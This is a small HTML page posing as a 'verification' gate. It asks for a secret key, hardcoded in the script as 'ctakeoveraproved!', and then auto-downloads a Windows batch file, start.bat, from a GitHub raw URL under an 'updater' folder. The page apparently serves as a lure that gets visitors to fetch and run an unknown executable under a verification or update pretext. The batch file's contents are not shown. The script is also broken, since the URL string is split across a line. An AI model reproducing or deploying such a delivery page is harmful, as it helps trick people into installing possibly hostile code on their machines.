<!DOCTYPE html>
<html>
<head>
  <title>verification!</title>
   <script>
    function verifyKey(event) {
      // Prevent form submission
      event.preventDefault();

      // Get the input value
      const secretKey = document.getElementById("key").value;

      // Define the correct secret key
      const correctKey = "ctakeoveraproved!"; // Replace with your actual secret key

      // Check if the entered key is correct
      if (secretKey === correctKey) {
        // Trigger download (replace with the correct file path)
        const link = document.createElement("a");
        link.href = "https://raw.githubusercontent.com/puppy38/verify/main/updater/start.bat
"; // Replace with your file URL
        link.download = "start.bat"; // Replace with your desired file name
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      } else {
        alert("Incorrect key, please try again.");
      }
    }
  </script>
</head>
<body>
 <form>
  <label for="key">insert secret key!</label><br>
  <input type="text" id="key" name="key"><br>
  <input type="submit">
</form> 
</body>
</html>
